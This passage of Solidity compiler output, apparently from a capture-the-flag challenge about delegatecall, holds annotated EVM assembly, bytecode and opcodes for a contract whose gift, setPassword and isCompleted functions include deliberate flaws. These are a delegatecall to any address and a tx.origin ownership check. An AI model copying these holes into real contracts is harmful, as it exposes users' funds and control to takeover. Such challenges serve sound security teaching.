\"shoot/3/delegatecall调用出错/1.sol\":1930:1941  mload(0x40) */\n      mload\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1978:1982  0x24 */\n      0x24\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1975:1976  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1970:1973  ptr */\n      dup3\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1955:1983  returndatacopy(ptr, 0, 0x24) */\n      returndatacopy\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2020:2086  0xffffffff00000000000000000000000000000000000000000000000000000000 */\n      0xffffffff00000000000000000000000000000000000000000000000000000000\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2014:2017  ptr */\n      dup2\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2008:2018  mload(ptr) */\n      mload\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2004:2087  and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) */\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1997:2087  sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) */\n      swap3\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2124:2127  ptr */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2118:2122  0x04 */\n      0x4\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2114:2128  add(0x04, ptr) */\n      add\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2108:2129  mload(add(0x04, ptr)) */\n      mload\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2101:2129  val := mload(add(0x04, ptr)) */\n      swap2\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1838:2140  {\r... */\n      pop\n      swap1\n      swap2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1175:1586  function gift(address _target)public{\r... */\n    tag_24:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1336:1346  bytes4 sel */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1347:1358  uint256 val */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1387:1399  bool success */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1298:1303  false */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1303  _target.delegatecall(abi.encodeWithSelector(this.gift.selector)) == false */\n      iszero\n      iszero\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1237  _target */\n      dup5\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1250  _target.delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1274:1292  this.gift.selector */\n      mul(0x100000000000000000000000000000000000000000000000000000000, 0xcbfc4bce)\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1251:1293  abi.encodeWithSelector(this.gift.selector) */\n      add(0x24, mload(0x40))\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1251:1293  abi.encodeWithSelector(this.gift.selector) */\n      swap1\n      0x40\n      mstore\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1251:1293  abi.encodeWithSelector(this.gift.selector) */\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1294  _target.delegatecall(abi.encodeWithSelector(this.gift.selector)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x0\n        /* \"--CODEGEN--\":8:108   */\n    tag_41:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_41)\n    tag_42:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1294  _target.delegatecall(abi.encodeWithSelector(this.gift.selector)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_44\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x1\n      dup4\n      0x20\n      sub\n      0x100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_44:\n      pop\n      swap2\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      gas\n      delegatecall\n      swap2\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1230:1303  _target.delegatecall(abi.encodeWithSelector(this.gift.selector)) == false */\n      iszero\n      iszero\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1222:1324  require(_target.delegatecall(abi.encodeWithSelector(this.gift.selector)) == false, \"unsafe execution\") */\n      iszero\n      iszero\n      tag_45\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x10\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x756e7361666520657865637574696f6e00000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_45:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1362:1374  getReturns() */\n      tag_46\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1362:1372  getReturns */\n      tag_21\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1362:1374  getReturns() */\n      jump\t// in\n    tag_46:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1335:1374  (bytes4 sel,uint256 val) = getReturns() */\n      swap3\n      pop\n      swap3\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1410:1414  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1402:1420  address(this).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1421:1424  sel */\n      dup4\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1402:1425  address(this).call(sel) */\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1387:1425  bool success = address(this).call(sel) */\n      swap1\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1444:1451  success */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1436:1470  require(success,\"gift call error\") */\n      iszero\n      iszero\n      tag_47\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0xf\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x676966742063616c6c206572726f720000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_47:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1500:1504  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1492:1510  address(this).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":789:814  this.setPassword.selector */\n      mul(0x100000000000000000000000000000000000000000000000000000000, 0x68e9a07e)\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1532:1535  val */\n      dup4\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1511:1536  abi.encodePacked(SET,val) */\n      add(0x20, mload(0x40))\n      dup1\n      dup4\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      dup2\n      mstore\n      0x4\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1511:1536  abi.encodePacked(SET,val) */\n      swap1\n      0x40\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1492:1537  address(this).call(abi.encodePacked(SET,val)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x0\n        /* \"--CODEGEN--\":8:108   */\n    tag_48:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_49\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_48)\n    tag_49:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1492:1537  address(this).call(abi.encodePacked(SET,val)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_51\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x1\n      dup4\n      0x20\n      sub\n      0x100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_51:\n      pop\n      swap2\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1483:1537  success =address(this).call(abi.encodePacked(SET,val)) */\n      swap1\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1556:1563  success */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1548:1578  require(success,\"call failed\") */\n      iszero\n      iszero\n      tag_52\n      jumpi\n      mload(0x40)\n      0x8c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0xb\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x63616c6c206661696c6564000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_52:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":1175:1586  function gift(address _target)public{\r... */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":731:751  uint256 public score */\n    tag_27:\n      sload(0x2)\n      dup2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2195:2384  function isCompleted()public{\r... */\n    tag_30:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2240:2241  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2234:2239  score */\n      0x2\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2234:2241  score=0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2267:2272  owner */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2255:2272  msg.sender==owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2255:2265  msg.sender */\n      caller\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2255:2272  msg.sender==owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2252:2309  if(msg.sender==owner){\r... */\n      iszero\n      tag_54\n      jumpi\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2295:2297  50 */\n      0x32\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2288:2293  score */\n      0x2\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2288:2297  score+=50 */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2252:2309  if(msg.sender==owner){\r... */\n    tag_54:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2334:2340  0x2022 */\n      0x2022\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2322:2330  password */\n      sload(0x1)\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2322:2340  password == 0x2022 */\n      eq\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2319:2377  if(password == 0x2022){\r... */\n      iszero\n      tag_55\n      jumpi\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2363:2365  50 */\n      0x32\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2356:2361  score */\n      0x2\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2356:2365  score+=50 */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2319:2377  if(password == 0x2022){\r... */\n    tag_55:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":2195:2384  function isCompleted()public{\r... */\n      jump\t// out\n\n    auxdata: 0xa165627a7a72305820cb11c4d36ce1bd8456b2a9ca0309f237dbfbb627bd20b6cee64bdc23f4723c2e0029\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506107f4806100606000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806340caae0614610085578063522e11771461009c57806368e9a07e146100a6578063ade58ccb146100d3578063cbfc4bce14610143578063efedc66914610186578063fa391c64146101b1575b005b34801561009157600080fd5b5061009a6101c8565b005b6100a4610244565b005b3480156100b257600080fd5b506100d160048036038101908080359060200190929190505050610294565b005b3480156100df57600080fd5b506100e86102d5565b60405180837bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191681526020018281526020019250505060405180910390f35b34801561014f57600080fd5b50610184600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610322565b005b34801561019257600080fd5b5061019b610733565b6040518082815260200191505060405180910390f35b3480156101bd57600080fd5b506101c6610739565b005b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561020257600080fd5b326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60003073ffffffffffffffffffffffffffffffffffffffff163111151561026a57600080fd5b3073ffffffffffffffffffffffffffffffffffffffff16313411156102925760646002819055505b565b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102ce57600080fd5b8060015550565b60008060243d1415156102e757600080fd5b60405160246000823e7fffffffff00000000000000000000000000000000000000000000000000000000815116925080600401519150509091565b60008060008015158473ffffffffffffffffffffffffffffffffffffffff1663cbfc4bce7c010000000000000000000000000000000000000000000000000000000002604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405180828051906020019080838360005b838110156103f55780820151818401526020810190506103da565b50505050905090810190601f1680156104225780820380516001836020036101000a031916815260200191505b50915050600060405180830381855af491505015151415156104ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260108152602001807f756e7361666520657865637574696f6e0000000000000000000000000000000081525060200191505060405180910390fd5b6104b46102d5565b925092503073ffffffffffffffffffffffffffffffffffffffff16837c010000000000000000000000000000000000000000000000000000000090046040518163ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303816000875af19250505090508015156105a7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f676966742063616c6c206572726f72000000000000000000000000000000000081525060200191505060405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff166368e9a07e7c0100000000000000000000000000000000000000000000000000000000028360405160200180837bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191681526004018281526020019250505060405160208183030381529060405260405180828051906020019080838360005b83811015610674578082015181840152602081019050610659565b50505050905090810190601f1680156106a15780820380516001836020036101000a031916815260200191505b509150506000604051808303816000865af1915050905080151561072d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f63616c6c206661696c656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b50505050565b60025481565b60006002819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156107a85760326002600082825401925050819055505b61202260015414156107c65760326002600082825401925050819055505b5600a165627a7a72305820cb11c4d36ce1bd8456b2a9ca0309f237dbfbb627bd20b6cee64bdc23f4723c2e0029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x7F4 DUP1 PUSH2 0x60 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x83 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x40CAAE06 EQ PUSH2 0x85 JUMPI DUP1 PUSH4 0x522E1177 EQ PUSH2 0x9C JUMPI DUP1 PUSH4 0x68E9A07E EQ PUSH2 0xA6 JUMPI DUP1 PUSH4 0xADE58CCB EQ PUSH2 0xD3 JUMPI DUP1 PUSH4 0xCBFC4BCE EQ PUSH2 0x143 JUMPI DUP1 PUSH4 0xEFEDC669 EQ PUSH2 0x186 JUMPI DUP1 PUSH4 0xFA391C64 EQ PUSH2 0x1B1 JUMPI JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x91 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9A PUSH2 0x1C8 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xA4 PUSH2 0x244 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xD1 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x294 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xDF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE8 PUSH2 0x2D5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP4 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x184 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x322 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x192 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19B PUSH2 0x733 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C6 PUSH2 0x739 JUMP JUMPDEST STOP JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO ISZERO PUSH2 0x202 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ORIGIN PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO ISZERO PUSH2 0x26A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE CALLVALUE GT ISZERO PUSH2 0x292 JUMPI PUSH1 0x64 PUSH1 0x2 DUP2 SWAP1 SSTORE POP JUMPDEST JUMP JUMPDEST ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO ISZERO PUSH2 0x2CE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x24 RETURNDATASIZE EQ ISZERO ISZERO PUSH2 0x2E7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x24 PUSH1 0x0 DUP3 RETURNDATACOPY PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP2 MLOAD AND SWAP3 POP DUP1 PUSH1 0x4 ADD MLOAD SWAP2 POP POP SWAP1 SWAP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 ISZERO ISZERO DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xCBFC4BCE PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x3F5 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x3DA JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x422 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP ISZERO ISZERO EQ ISZERO ISZERO PUSH2 0x4AC JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x10 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x756E7361666520657865637574696F6E00000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x4B4 PUSH2 0x2D5 JUMP 